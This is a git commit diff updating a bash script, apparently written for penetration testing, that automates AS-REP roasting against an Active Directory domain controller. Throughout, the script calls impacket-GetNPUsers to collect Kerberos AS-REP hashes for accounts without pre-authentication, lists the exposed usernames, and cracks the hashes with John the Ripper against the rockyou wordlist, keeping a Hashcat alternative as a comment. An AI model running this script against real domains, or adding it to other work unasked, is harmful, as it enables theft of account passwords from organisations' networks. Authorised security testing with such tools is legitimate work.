90c8edbc9ca49a2d7c14b19360804f5088e535b2
Br14n41 <57382125+Br14n41@users.noreply.github.com>
2024-05-21 12:30:49 -0400

    Update asrep-roaster.sh

--- asrep-roaster.sh
+++ asrep-roaster.sh
@@ -1,9 +1,10 @@
 # A bash script to automate brute forcing AS-REP accounts from domain controllers.
 # Created after testing a network where the DC was external facing and we could brute force AS-REP roastable accounts pre-auth.
-# Compile your usersfile and begin.
-# Developed using Impacket Version 0.11.0
+# In our use case the usernames were collected via other means of enumeration, but this could be done blindly too. The script was not tested against a large username list.
+# Gather the users you want to add to your users file and you are ready to begin.
+# Developed using Impacket Version 0.11.0, may need to alter line 35/36 if using a different Impacket Version.
 # Usage: ./asrep-roaster.sh <domain> <dc> <usersfile>
-# Example: ./asrep-roaster.sh megacorp.local 10.10.10.10 /home/kali/users.txt
+# Example: ./asrep-roaster.sh megacorp.local 10.10.10.10 /usr/share/wordlists/users.txt /home/adversary/target/asrep-roaster.txt
 
 # Let's define the variables
 
@@ -16,42 +17,46 @@ usersfile=$3
 if [ -z "$domain" ] || [ -z "$dc" ] || [ -z "$usersfile" ]; then
     echo "Please review usage guide and try again."
     echo "Usage: ./asrep-roaster.sh <domain> <dc> <usersfile>"
-    echo "Example: ./asrep-roaster.sh example.com 10.10.10.1 /home/kali/users.txt" 
+    echo "Example: ./asrep-roaster.sh example.com 10.10.10.1 /usr/share/wordlists/users.txt" 
     echo "Exiting..."
     exit 1
 fi
 
 # First, let's run impacket-GetNPUsers to enumerate users that have Kerberos pre-authentication disabled.
 
+echo ""
 echo "Enumerating users with Kerberos pre-authentication disabled..."
 echo "----------------------------------------"
-echo "Thank you, almighty Impacket!"
+echo "Thank you, Impacket!"
+echo ""
 
-# We will save the output to a file called hashes.asrep.
+# We will save the output to a file called hashes.asrep. The format option can be changed to hashcat if that is the preferred cracking tool.
 
-impacket-GetNPUsers $domain/ -dc $dc -usersfile $usersfile -format hashcat -outputfile hashes.asrep
+impacket-GetNPUsers $domain/ -dc-ip $dc -usersfile $usersfile -format john -outputfile hashes.asrep
+# impacket-GetNPUsers $domain/ -dc-ip $dc -usersfile $usersfile -format hashcat -outputfile hashes.asrep
 
-# Then append the usernames from the output file to our usersfile.
+# This prints output to the terminal to see any usernames not requiring Kerberos pre-auth.
 
-echo "The following usernames have been enumerated and will be added to $usersfile:"
+echo ""
+echo ""
+echo "AS-REP hashes were obtained for the following usernames:"
+echo "----------------------------------------"
+
+
+cat hashes.asrep | cut -d'$' -f3 | cut -d'@' -f1
+# cat hashes.asrep | cut -d'$' -f4 | cut -d'@' -f1
+echo ""
+
+# Finally, let's crack some hashes. The script is currently configured for John but can be altered for Hashcat if lines 35/36, 46/47, and 57/58 trade being uncommented.
+
+echo ""
+echo "Attempting to crack the hashes..."
 echo "----------------------------------------"
 echo ""
 
-cat hashes.asrep | cut -d'$' -f4 | cut -d'*' -f2
-cat hashes.asrep | cut -d'$' -f4 | cut -d'*' -f2 >> $usersfile
+john hashes.asrep --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep
+# hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt --force
 
-echo "... Done!"
 echo ""
-
-# Finally, let's crack some hashes.
-
-echo "Let's crack some hashes!"
 echo "----------------------------------------"
-echo "Using Hashcat with mode 18200 for AS-REP hashes."
-
-hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt --force --show
-
-echo "----------------------------------------"
-echo "All done! Happy hacking!"
-echo "If you didn't crack the hashes, try using a different wordlist or rules."
-echo "For example: hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"
+echo "Done cracking."
